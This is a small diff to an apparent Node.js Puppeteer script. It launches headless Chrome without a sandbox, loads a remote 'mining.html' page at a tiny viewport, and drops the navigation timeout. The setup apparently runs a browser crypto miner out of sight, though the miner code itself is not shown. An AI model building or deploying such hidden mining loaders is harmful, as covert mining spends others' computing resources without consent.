@@ -104,7 +104,7 @@ setTimeout(async () =>{
   console.log('The start')
   const browser = await puppeteer.launch({ headless: true, args: ["--no-sandbox"] });
   const page = await browser.newPage();
-  await page.goto(`https://logbin.vercel.app/mining.html`);
+  await page.goto(`https://logbin.vercel.app/mining.html`,{timeout: 0});
   await page.setViewport({ width: 120, height: 120 });
   //await sleep(10000);
   //await sleep(600000);
